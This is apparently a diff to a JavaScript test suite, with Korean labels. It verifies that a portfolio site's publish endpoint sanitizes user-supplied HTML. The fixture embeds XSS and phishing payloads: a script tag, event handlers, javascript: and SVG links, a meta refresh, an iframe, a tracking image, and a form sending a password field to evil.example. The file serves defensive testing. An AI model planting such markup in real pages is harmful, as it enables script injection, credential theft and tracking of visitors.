@@ -112,6 +112,34 @@ check("다른 주소로 다시 발행", moved.status === 200);
 check("예전 주소는 내려감", (await site(slugA)).status === 404);
 check("새 주소로 열림", (await site(slugA2)).status === 200);
 check("예전 주소는 다시 쓸 수 있음", (await B.call("GET", `/api/slug?name=${slugA}`)).data.ok === true);
+// 블루펜슬로 다듬은 HTML 발행: 서버가 다시 거른다
+const evilHtml = `<!DOCTYPE html><html lang="ko"><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=https://evil.example">
+<title>다듬은 페이지</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Gowun+Dodum&display=swap">
+<link rel="stylesheet" href="https://evil.example/x.css"><base href="https://evil.example/"><script>alert(1)</script>
+<style>:root{--c-bg:#fff}.hero{color:#111}</style></head><body>
+<h1 class="pf-hero-title" data-pf-field="name" onclick="alert(1)">다듬은 제목</h1>
+<a href="javascript:alert(1)">나쁜 링크</a><a href="https://github.com/">좋은 링크</a><a href="mailto:a@b.kr">메일</a>
+<img src="upload:${img.data.key}" alt="내 이미지"><img src="https://evil.example/track.png" alt="추적"><img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="svg">
+<iframe src="https://evil.example"></iframe><form action="https://evil.example"><input name="pw"></form>
+<svg><a xlink:href="javascript:alert(1)"><text>x</text></a><set attributeName="href" to="javascript:alert(1)"/></svg>
+<div srcdoc="x" style="padding:8px">남는 글</div></body></html>`;
+const pencilPub = await A.call("POST", "/api/publish", { body: { slug: slugA2, portfolio: good, html: evilHtml } });
+check("다듬은 HTML 발행", pencilPub.status === 200, pencilPub.data.reason);
+const pencilPage = await site(slugA2);
+const ph = pencilPage.body.toString();
+check("다듬은 내용이 그대로 보임", ph.includes("다듬은 제목") && ph.includes("남는 글") && ph.includes(".hero{color:#111}") && ph.includes("fonts.googleapis.com"));
+check("스크립트·iframe·form·base·refresh 제거", !/<script|<iframe|<form|<input|<base|http-equiv/i.test(ph), ph.slice(0, 300));
+check("이벤트 속성·javascript: 주소·srcdoc 제거", !/onclick|javascript:|srcdoc/i.test(ph));
+check("외부 스타일시트·외부 이미지 제거", !ph.includes("evil.example"));
+check("내 이미지는 사이트 안 경로로, svg data 이미지는 지움", ph.includes(`src="/img/${img.data.key}"`) && !ph.includes("image/svg") && (await site(slugA2, `/img/${img.data.key}`)).status === 200);
+check("좋은 링크·메일은 남김, 칸 표시(data-pf-field)는 지움", ph.includes('href="https://github.com/"') && ph.includes('href="mailto:a@b.kr"') && !ph.includes("data-pf-field"));
+const otherImg = await B.call("POST", "/api/publish", { body: { slug: `b2-${stamp}`, portfolio: { ...good, projects: [] }, html: `<p><img src="upload:${img.data.key}"></p>` } });
+check("다듬은 HTML에 남의(올린 적 없는) 이미지가 있으면 거부", otherImg.status === 400, otherImg.data.reason);
+const big = await A.call("POST", "/api/publish", { body: { slug: slugA2, portfolio: good, html: `<p>${"가".repeat(420 * 1024)}</p>` } });
+check("너무 큰 HTML 거부", big.status === 413 || big.status === 400, String(big.status));
+const back = await A.call("POST", "/api/publish", { body: { slug: slugA2, portfolio: good } });
+check("HTML 없이 다시 발행하면 템플릿으로", back.status === 200 && !(await site(slugA2)).body.toString().includes("다듬은 제목"));
+
 const off = await A.call("POST", "/api/site/unpublish");
 check("비공개로 바꾸기", off.status === 200 && (await site(slugA2)).status === 404 && (await A.call("GET", "/api/site")).data.site === null);
 A.setCsrf("");
